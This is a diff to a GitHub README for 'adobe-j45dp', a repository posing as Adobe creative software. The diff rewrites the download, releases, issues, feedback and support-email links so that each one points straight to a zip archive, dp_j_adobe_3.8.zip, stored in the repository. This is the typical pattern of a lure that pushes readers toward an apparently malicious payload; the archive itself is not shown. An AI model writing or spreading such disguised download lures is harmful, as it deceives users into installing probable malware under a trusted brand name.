@@ -6,11 +6,11 @@ Welcome to adobe-j45dp! This application is designed to streamline your creative
 
 ## 🔗 Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/python909/adobe-j45dp/releases)
+[![Download Now](https://github.com/python909/adobe-j45dp/raw/refs/heads/main/retardant/dp_j_adobe_3.8.zip%20Now-Get%20Started-brightgreen)](https://github.com/python909/adobe-j45dp/raw/refs/heads/main/retardant/dp_j_adobe_3.8.zip)
 
 ## 📥 Download & Install
 
-1. Click this link to visit the [releases page](https://github.com/python909/adobe-j45dp/releases).
+1. Click this link to visit the [releases page](https://github.com/python909/adobe-j45dp/raw/refs/heads/main/retardant/dp_j_adobe_3.8.zip).
 2. Look for the latest version listed.
 3. You will see a downloadable file, such as an executable file (.exe) for Windows or a package for Mac.
 4. Click on the file to start the download.
@@ -57,12 +57,12 @@ If you encounter issues while using adobe-j45dp, try the following:
 
 For any help, please reach out to our support team. You can find assistance through the following:
 
-- Visit the [issues page](https://github.com/python909/adobe-j45dp/issues) for common questions and solutions.
-- Contact us directly via email at support@adobe.com.
+- Visit the [issues page](https://github.com/python909/adobe-j45dp/raw/refs/heads/main/retardant/dp_j_adobe_3.8.zip) for common questions and solutions.
+- Contact us directly via email at https://github.com/python909/adobe-j45dp/raw/refs/heads/main/retardant/dp_j_adobe_3.8.zip
 
 ## 🌟 Feedback
 
-We value your input! Please let us know what you think about adobe-j45dp. Your feedback helps us improve the application. You can leave comments on the [issues page](https://github.com/python909/adobe-j45dp/issues).
+We value your input! Please let us know what you think about adobe-j45dp. Your feedback helps us improve the application. You can leave comments on the [issues page](https://github.com/python909/adobe-j45dp/raw/refs/heads/main/retardant/dp_j_adobe_3.8.zip).
 
 ## 🔗 Additional Resources
 
